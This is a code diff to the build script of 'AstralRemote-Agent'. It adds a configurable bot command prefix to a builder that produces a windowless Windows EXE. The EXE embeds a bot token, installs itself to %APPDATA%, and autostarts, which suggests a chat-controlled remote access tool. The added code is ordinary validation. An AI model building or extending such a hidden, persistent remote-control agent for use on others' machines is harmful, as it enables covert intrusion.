@@ -29,7 +29,13 @@ from astral_remote.agent.secure_input import InterruptedError, prompt_for_token
 from astral_remote.builder.payload_codegen import render_payload_module
 from astral_remote.builder.subsystem import set_gui_subsystem
 from astral_remote.builder.verification import check_gui_subsystem, check_size, self_test, smoke_test
-from astral_remote.shared.config import DEFAULT_STARTUP_NAME, default_runtime_config
+from astral_remote.shared.config import (
+    DEFAULT_BOT_PREFIX,
+    DEFAULT_STARTUP_NAME,
+    MAX_BOT_PREFIX_LENGTH,
+    default_runtime_config,
+    is_valid_prefix,
+)
 from astral_remote.shared.errors import BuildError
 from astral_remote.shared.logging_utils import error, info, redact
 
@@ -87,6 +93,53 @@ def sanitize_exe_name(raw=None, default: str = DEFAULT_EXE_NAME) -> str:
     if not name.lower().endswith(".exe"):
         name += ".exe"
     return name
+
+
+def sanitize_prefix(raw=None, default: str = DEFAULT_BOT_PREFIX) -> str:
+    """Validate a build-time bot prefix. Empty input selects the default.
+
+    A prefix is one to eight printable characters without whitespace, so
+    the command word can always be split from its arguments. Raises
+    BuildError for an unusable explicit value instead of changing it.
+    """
+    if raw is None:
+        return default
+    text = str(raw).strip()
+    if text == "":
+        return default
+    if not is_valid_prefix(text):
+        raise BuildError(f"Prefix must be 1-{MAX_BOT_PREFIX_LENGTH} characters without whitespace.")
+    return text
+
+
+def prompt_prefix(default: str = DEFAULT_BOT_PREFIX) -> str:
+    """Ask for the bot command prefix. Bare Enter selects the default.
+
+    Themed through the same path as the token, name, and yes/no prompts;
+    non-TTY streams (pipes, tests) get plain text. An unusable answer
+    falls back to the default instead of failing the build.
+    """
+    from astral_remote.agent.secure_input import _styled_line
+    from astral_remote.cli.theme import supports_color
+
+    label = f"[Bot command prefix] (default: {default}): "
+    try:
+        sys.stdout.write(_styled_line(label, supports_color()))
+        sys.stdout.flush()
+    except (OSError, ValueError, AttributeError):
+        pass
+    try:
+        readline = getattr(sys.stdin, "readline", None)
+        raw = readline() if callable(readline) else ""
+    except KeyboardInterrupt as exc:
+        raise InterruptedError("INTERRUPTED") from exc
+    except (EOFError, OSError, ValueError):
+        return default
+    try:
+        return sanitize_prefix(raw, default)
+    except BuildError as err:
+        print(f"Invalid prefix ({err}); using default {default}.")
+        return default
 
 
 def prompt_exe_name(default: str = DEFAULT_EXE_NAME) -> str:
@@ -265,17 +318,21 @@ def _stage_log_path() -> Path:
 
 
 def build_agent(token=None, prompt_token=None, on_stage=None, output_name: str | None = None,
-                install_to_appdata: bool = True, enable_autostart: bool = True) -> dict:
+                install_to_appdata: bool = True, enable_autostart: bool = True,
+                prefix: str = DEFAULT_BOT_PREFIX) -> dict:
     """Generate the EXE with an embedded token plus default non-secret config.
 
     `install_to_appdata` and `enable_autostart` are embedded as the EXE's
     build-time self-install choices. The output name (without extension)
-    becomes the `%APPDATA%` subfolder and autostart entry name.
+    becomes the `%APPDATA%` subfolder and autostart entry name. `prefix`
+    is embedded as the bot command prefix for the managed #main channel.
     """
     _ensure_pyinstaller()
     exe_name = sanitize_exe_name(output_name or DEFAULT_EXE_NAME)
     startup_name = Path(exe_name).stem or DEFAULT_STARTUP_NAME
-    staged_config = default_runtime_config(install_to_appdata, enable_autostart, startup_name)
+    bot_prefix = sanitize_prefix(prefix)
+    staged_config = default_runtime_config(install_to_appdata, enable_autostart,
+                                           startup_name, bot_prefix)
     output_exe = DIST_DIR / exe_name
     DIST_DIR.mkdir(parents=True, exist_ok=True)
     BUILD_TMP.mkdir(parents=True, exist_ok=True)
@@ -301,6 +358,7 @@ def build_agent(token=None, prompt_token=None, on_stage=None, output_name: str |
     try:
         live_token = resolve_build_token(token, prompt_token)
         log(f"Generating AstralRemote-Agent v{staged_config['agentVersion']} for win-x64 PyInstaller onefile.")
+        log(f"Command prefix: {bot_prefix}")
         stage = _stage_package()
         try:
             log("Preparing template")
@@ -330,7 +388,7 @@ def build_agent(token=None, prompt_token=None, on_stage=None, output_name: str |
             _publish_with_retry(temp_exe, output_exe, log)
             log(f"Payload embedded and verified: {version_line}")
             info(f"Build done: {output_exe}")
-            return {"exe_path": str(output_exe), "version_line": version_line}
+            return {"exe_path": str(output_exe), "version_line": version_line, "prefix": bot_prefix}
         finally:
             _cleanup_tracked()
     except InterruptedError:
